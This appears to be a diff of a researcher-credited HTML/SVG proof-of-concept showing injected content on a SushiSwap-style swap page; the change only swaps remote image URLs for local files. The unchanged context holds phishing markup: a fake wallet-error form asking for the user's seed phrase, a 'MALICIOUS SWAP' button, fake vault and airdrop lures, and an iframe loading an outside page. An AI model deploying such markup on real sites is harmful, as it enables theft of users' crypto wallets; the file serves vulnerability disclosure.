@@ -38,7 +38,7 @@
 <b style="font-size:21px;">Proof of Concept: (<xss style="color:navy !important">XSS/DEFACE/ABILITY TO HOST ANY CONTENT/SIGN TRANSACTIONS</xss>)<p></p> by <xss style="color:#9b111e !important">UNITED GLOBAL WHITEHAT SECURITY TEAM</xss> at UGWST.COM (security@ugwst.com)<p></p>Researchers: <xss style="color:#9b111e !important">René Kroka</xss> and <xss style="color:#9b111e !important">Jose C Almeida</xss></b><br></br>
 <br></br>
 <h1 style="margin: auto;width:50%; font-size: revert !important; font-weight: revert !important;"><b style="color:#9b111e !important">PHISHING WARNING:</b>
-please make sure you're visiting<img src="https://www.pngall.com/wp-content/uploads/2/SSL-PNG-Free-Image.png" width="40px !important;" style="display:revert !important;"></img><xss style="color:purple !important">https://app.sushi.com</xss> - !CHECK THE URL!</h1>
+please make sure you're visiting<img src="SSL-PNG-Free-Image.png" width="40px !important;" style="display:revert !important;"></img><xss style="color:purple !important">https://app.sushi.com</xss> - !CHECK THE URL!</h1>
 <br></br><br></br><br></br>
 <div class="relative filter drop-shadow z-10">
 <div class="p-4 space-y-4 rounded bg-dark-900 z-1">
@@ -73,7 +73,7 @@ Liquidity</a>
 <div class="rounded-full" style="width: 54px; height: 54px;">
 <div class="overflow-hidden rounded" style="width: 54px; height: 54px;">
 <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 54px; height: 54px; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
-<img alt="ETH" src="https://res.cloudinary.com/sushi-cdn/image/fetch/w_128,f_auto,q_auto/https://raw.githubusercontent.com/sushiswap/logos/main/token/eth.jpg" decoding="async" data-nimg="fixed" class="rounded-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;" srcset="https://res.cloudinary.com/sushi-cdn/image/fetch/w_64,f_auto,q_auto/https://raw.githubusercontent.com/sushiswap/logos/main/token/eth.jpg 1x, https://res.cloudinary.com/sushi-cdn/image/fetch/w_128,f_auto,q_auto/https://raw.githubusercontent.com/sushiswap/logos/main/token/eth.jpg 2x"></img>
+<img alt="ETH" src="eth.jpg" decoding="async" data-nimg="fixed" class="rounded-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;" srcset="eth.jpg 1x, eth.jpg 2x"></img>
 </span></div></div></div><div class="flex flex-1 flex-col items-start justify-center mx-3.5">
 <div class="text-xs font-medium text-secondary whitespace-nowrap">
 Swap From:</div><div class="flex items-center">
@@ -119,7 +119,7 @@ Balance: 0.002769 ETH</div><div class="flex justify-end space-x-1 text-xs font-m
 <div class="rounded-full" style="width: 54px; height: 54px;">
 <div class="overflow-hidden rounded" style="width: 54px; height: 54px;">
 <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 54px; height: 54px; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
-<img alt="SUSHI" src="https://res.cloudinary.com/sushi-cdn/image/fetch/w_128,f_auto,q_auto/https://raw.githubusercontent.com/sushiswap/icons/master/token/sushi.jpg" decoding="async" data-nimg="fixed" class="rounded-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;" srcset="https://res.cloudinary.com/sushi-cdn/image/fetch/w_64,f_auto,q_auto/https://raw.githubusercontent.com/sushiswap/icons/master/token/sushi.jpg 1x, https://res.cloudinary.com/sushi-cdn/image/fetch/w_128,f_auto,q_auto/https://raw.githubusercontent.com/sushiswap/icons/master/token/sushi.jpg 2x"></img>
+<img alt="SUSHI" src="sushi.jpg" decoding="async" data-nimg="fixed" class="rounded-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;" srcset="sushi.jpg 1x, sushi.jpg 2x"></img>
 </span></div></div></div><div class="flex flex-1 flex-col items-start justify-center mx-3.5">
 <div class="text-xs font-medium text-secondary whitespace-nowrap">
 Swap To (est.):</div><div class="flex items-center">
@@ -141,9 +141,9 @@ MALICIOUS SWAP</button>
 <div class="relative h-[96px] mt-4">
 </div></div></div>
 <b>There was an error connecting your WEB3 Ethereum wallet please enter your seedphrase below:</b><br></br><textarea cols="85" rows="5"></textarea><p></p><input type="submit" value="Submit"></input>
-<div style="text-align:right;"><b>Deposit into SECURED <xss style="color:purple !important"><img src="https://s2.coinmarketcap.com/static/img/coins/200x200/6758.png" width="20px !important;" style="display:revert !important;"></img>$SUSHI</xss> vault:</b><br></br><button class="button button1">Deposit</button>
+<div style="text-align:right;"><b>Deposit into SECURED <xss style="color:purple !important"><img src="6758.png" width="20px !important;" style="display:revert !important;"></img>$SUSHI</xss> vault:</b><br></br><button class="button button1">Deposit</button>
 <button class="button button2">Withdraw</button> </div>
- <h1 style="margin: auto;width:35%; font-size: revert !important; font-weight: revert !important;">FREE <xss style="color:purple !important"><img src="https://s2.coinmarketcap.com/static/img/coins/200x200/6758.png" width="30px !important;" style="display:revert !important;"></img>$SUSHI</xss> AIRDROP:</h1>
+ <h1 style="margin: auto;width:35%; font-size: revert !important; font-weight: revert !important;">FREE <xss style="color:purple !important"><img src="6758.png" width="30px !important;" style="display:revert !important;"></img>$SUSHI</xss> AIRDROP:</h1>
   <h1 style="margin: auto;width:50%;"><iframe scrolling="no" style="margin: auto;width:80%;" frameborder="none; display:block;" height="430px" src="https://renekroka.github.io/testc/index.html"></iframe></h1>
       </body>
     </foreignObject>
